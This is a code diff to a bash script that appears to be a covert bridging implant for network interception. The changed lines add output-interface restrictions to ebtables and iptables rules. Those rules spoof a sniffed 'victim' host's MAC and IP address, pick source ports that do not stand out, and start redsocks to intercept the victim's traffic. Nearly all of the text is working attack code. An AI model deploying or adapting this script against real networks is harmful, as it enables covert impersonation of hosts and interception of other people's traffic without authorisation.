@@ -63,13 +63,13 @@ iptables -t raw -F
 # Safety Rules: Make sure we don't send any packets with our own identity
 victim_dev_mac=$(ip addr show ${victim_dev} | grep ether | (read null ether null ; echo $ether))
 router_dev_mac=$(ip addr show ${router_dev} | grep ether | (read null ether null ; echo $ether))
-ebtables -t nat -I POSTROUTING -s ${br_dev_mac} -j DROP
-ebtables -t nat -I POSTROUTING -s ${victim_dev_mac} -j DROP
-ebtables -t nat -I POSTROUTING -s ${router_dev_mac} -j DROP
+ebtables -t nat -I POSTROUTING -o ${br_dev} -s ${br_dev_mac} -j DROP
+ebtables -t nat -I POSTROUTING -o ${br_dev} -s ${victim_dev_mac} -j DROP
+ebtables -t nat -I POSTROUTING -o ${br_dev} -s ${router_dev_mac} -j DROP
 
 # Make sure we don't send any traffic of our own to Multicast or Bridge Group Addresses
-ebtables -t filter -I OUTPUT -d Multicast -j DROP
-ebtables -t filter -I OUTPUT -d BGA -j DROP
+ebtables -t filter -I OUTPUT -o ${br_dev} -d Multicast -j DROP
+ebtables -t filter -I OUTPUT -o ${br_dev} -d BGA -j DROP
 
 # Make sure the bridge is up
 if ! brctl show $br_dev > /dev/null 2>&1 ; then
@@ -118,7 +118,7 @@ while read null MAC1 null MAC2 null null null IP1 null IP2 null ; do
 	if [ -n "${victim_ip}" ] ; then
 		kill $(cat /tmp/tcpdump.pid) 2> /dev/null
 	fi
-done < <(tcpdump -q -nneli ${br_dev} ip 2> /dev/null & echo $! > /tmp/tcpdump.pid)
+done < <(tcpdump -q -neli ${br_dev} ip 2> /dev/null & echo $! > /tmp/tcpdump.pid)
 
 echo "Got Victim ${victim_mac} (${victim_ip})"
 
@@ -127,18 +127,18 @@ echo "Got Victim ${victim_mac} (${victim_ip})"
 # Rules are sorted in reverse order because they are inserted at the top of the list, and
 # therefore get pushed down as each new entry is added
 # This is particularly important for ebtables, because we need to be before the "safety" rules
-ebtables -t nat -I POSTROUTING -s ${br_dev_mac} ! -d $victim_mac -j snat --to-source $victim_mac
-iptables -t nat -I POSTROUTING -s ${br_dev_ip}  ! -d $victim_ip -j SNAT --to $victim_ip
+ebtables -t nat -I POSTROUTING -o ${br_dev} -s ${br_dev_mac} ! -d $victim_mac -j snat --to-source $victim_mac
+iptables -t nat -I POSTROUTING -o ${br_dev} -s ${br_dev_ip}  ! -d $victim_ip -j SNAT --to $victim_ip
 
 # We special case TCP and UDP to be able to rewrite the source ports so as not to stand out
 # This range is suitable for a predominantly Windows network
-iptables -t nat -I POSTROUTING -p tcp -s ${br_dev_ip} ! -d $victim_ip -j SNAT --to $victim_ip:49152-65535
-iptables -t nat -I POSTROUTING -p udp -s ${br_dev_ip} ! -d $victim_ip -j SNAT --to $victim_ip:49152-65535
+iptables -t nat -I POSTROUTING -o ${br_dev} -p tcp -s ${br_dev_ip} ! -d $victim_ip -j SNAT --to $victim_ip:49152-65535
+iptables -t nat -I POSTROUTING -o ${br_dev} -p udp -s ${br_dev_ip} ! -d $victim_ip -j SNAT --to $victim_ip:49152-65535
 
-# ebtables -t nat -I POSTROUTING -s ${br_dev_mac}   -d $victim_mac -j snat --to-source $router_mac
-# iptables -t nat -I POSTROUTING -s ${br_dev_ip}    -d $victim_ip -j SNAT --to $router_ip
-# iptables -t nat -I POSTROUTING -p tcp -s ${br_dev_ip}   -d $victim_ip -j SNAT --to $router_ip:49152-65535
-# iptables -t nat -I POSTROUTING -p udp -s ${br_dev_ip}   -d $victim_ip -j SNAT --to $router_ip:49152-65535
+# ebtables -t nat -I POSTROUTING -o ${br_dev} -s ${br_dev_mac}   -d $victim_mac -j snat --to-source $router_mac
+# iptables -t nat -I POSTROUTING -o ${br_dev} -s ${br_dev_ip}    -d $victim_ip -j SNAT --to $router_ip
+# iptables -t nat -I POSTROUTING -o ${br_dev} -p tcp -s ${br_dev_ip}   -d $victim_ip -j SNAT --to $router_ip:49152-65535
+# iptables -t nat -I POSTROUTING -o ${br_dev} -p udp -s ${br_dev_ip}   -d $victim_ip -j SNAT --to $router_ip:49152-65535
 
 # redsocks is useful for intercepting traffic going to or from the victim
 screen -S pitm -X screen -t "redsocks" redsocks -c /etc/redsocks.conf
